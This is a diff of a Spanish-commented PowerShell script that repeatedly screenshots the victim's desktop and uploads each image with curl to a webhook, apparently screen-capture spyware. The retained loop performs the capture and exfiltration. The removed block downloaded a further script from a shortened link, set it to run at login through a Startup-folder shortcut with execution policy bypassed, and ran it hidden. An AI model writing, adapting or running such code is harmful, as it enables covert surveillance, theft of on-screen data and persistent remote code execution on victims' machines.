@@ -4,7 +4,10 @@ $a = 0 # Contador de imágenes enviadas al webhook
 $maxImages = 1 # Cantidad máxima de imágenes antes de descargar el otro script
 
 # Detección de URL acortada
-if ($hookurl.Length -ne 121){Write-Host "Shortened Webhook URL Detected!!kk.." ; $hookurl = (irm $hookurl).url}
+if ($hookurl.Length -ne 121) {
+    Write-Host "Shortened Webhook URL Detecteduu!!..." 
+    $hookurl = (irm $hookurl).url
+}
 
 do {
     $Filett = "$env:temp\SC.png"
@@ -20,9 +23,9 @@ do {
     $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
     $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
     Start-Sleep 1
-    curl.exe -F "file1=@$filett" $hookurl
+    curl.exe -F "file1=@$Filett" $hookurl
     Start-Sleep 1
-    Remove-Item -Path $filett -Force
+    Remove-Item -Path $Filett -Force
     Start-Sleep $seconds
 
     # Incrementar contador de imágenes enviadas al webhook
@@ -30,22 +33,6 @@ do {
 
     # Verificar si se ha alcanzado la cantidad máxima de imágenes
     if ($a -eq $maxImages) {
-        # Descargar el script principal
-        $syswUrl = "https://bit.ly/Screen_dc"
-        $syswPath = "$env:USERPROFILE\sysw.ps1"
-        Invoke-WebRequest -Uri $syswUrl -OutFile $syswPath
-        
-        # Crear acceso directo en la carpeta de inicio del usuario
-        $shortcutLocation = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sysw.lnk"
-        $shell = New-Object -ComObject WScript.Shell
-        $shortcut = $shell.CreateShortcut($shortcutLocation)
-        $shortcut.TargetPath = "powershell.exe"
-        $shortcut.Arguments = "-ExecutionPolicy Bypass -NoNewWindow -File `"$syswPath`""
-        $shortcut.Save()
-        
-        # Ejecutar el script principal de manera oculta
-        Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -NoNewWindow -File `"$syswPath`"" -WindowStyle Hidden
-        
         # Reiniciar contador de imágenes
         $a = 0
     }
